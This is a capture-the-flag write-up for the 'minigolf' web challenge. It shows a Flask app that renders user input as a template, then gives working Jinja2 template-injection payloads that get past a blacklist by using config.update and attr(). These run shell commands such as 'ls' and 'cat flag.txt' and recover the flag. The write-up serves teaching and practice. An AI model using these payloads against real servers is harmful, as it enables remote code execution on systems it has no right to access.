## Challenge Name: minigolf  
Category: Web  
Points: 172  
Solves: 64  

Challenge Description: 
Too much Flask last year... let's bring it back again.

Link: http://minigolf.chal.imaginaryctf.org  

### Approach
The site displays the python source code.  
```
from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]

@app.route('/', methods=['GET'])
def home():
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."
    if len(txt) <= 69:
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')

app.run('0.0.0.0', 1337)
```

This challenge is basically the same with `ssti-golf` challenge but this one had some words filtered.  
First of all, double brackets are filtered. We need to use `{%payload%}`.  
The problem is that we have limited payloads now and we also have to bypass `_`.  
The `{%%}` can be used for a if statement.  
We'll use the if statement to make the server check for the statement. Thus making it run malicious code.  
We can also use `print()` function.  
The equivlent of normal ssti payload `{{config}}` would be `{% print config %}`  

![config](https://github.com/0xL30N3/Writeups/blob/main/Images/minigolf.png)

Our injection point this time will be the `txt` parameter.  
To execute `{{lipsum.__globals__.os.popen('ls').read()}}` our payload needs to be in an if statement.
I bypassed the underscore in `__globals__` by declaring it as a config variable.  
I did this using this payload.  
`{%if%20config.update(a=request.args.a)==1%20%}1{%%20endif%}&a=__globals__`  
In order to check the if statement, the system would need to first run the code we have in the statement to compare it with `1`.  
That's why we can execute code in if statements.  
The `txt` parameter won't allow underscore so, I passed it in another parameter called `a`.  

We can recall the variable with the name `config.a`.  
I also declared another variable for the system command.  
`{%if%20config.update(g=request.args.g)==1%20%}1{%%20endif%}&g=ls`  
Finally, use print to display the output of the payload.  
`{%print(lipsum|attr(config.a)).os.popen(config.g).read()%}`  
`|attr(config)` is the same as `.` but it works for config variables.  
The payload returns the directory listing and we find the `flag.txt` file there.  

![ls](https://github.com/0xL30N3/Writeups/blob/main/Images/minigolf2.png)   

Then I changed the Config variable g to `cat flag.txt` using the same payload.  
`{%if%20config.update(g=request.args.g)==1%20%}1{%%20endif%}&g=cat%20flag.txt`  

I executed `{%print(lipsum|attr(config.a)).os.popen(config.g).read()%}` again and this time, it returned me the flag.
![flag](https://github.com/0xL30N3/Writeups/blob/main/Images/image.png)  

__Flag: `ictf{whats_in_the_flask_tho}`__
